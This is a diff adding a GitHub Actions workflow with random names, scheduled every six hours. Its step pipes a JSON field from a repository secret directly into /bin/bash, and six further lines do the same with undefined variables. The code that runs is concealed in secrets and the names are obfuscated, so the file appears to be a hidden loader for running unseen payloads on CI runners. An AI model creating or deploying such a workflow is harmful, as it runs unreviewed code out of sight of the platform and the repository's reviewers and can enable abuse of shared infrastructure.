@@ -1,0 +1,22 @@
+name: zhangshancui4657
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangshancui4657
+        env:
+          d2: ${{ secrets.d2 }}
+        run: |
+          echo $d2 | jq -r .qyrou9232 | /bin/bash
+          echo $vek2 | jq -r .szoxu61 | /bin/bash
+          echo $q409 | jq -r .x43 | /bin/bash
+          echo $s1 | jq -r .cexfq0177 | /bin/bash
+          echo $lcyxf032 | jq -r .f3369 | /bin/bash
+          echo $tzd303 | jq -r .rno0 | /bin/bash
+          echo $mlm186 | jq -r .wuz3 | /bin/bash
+
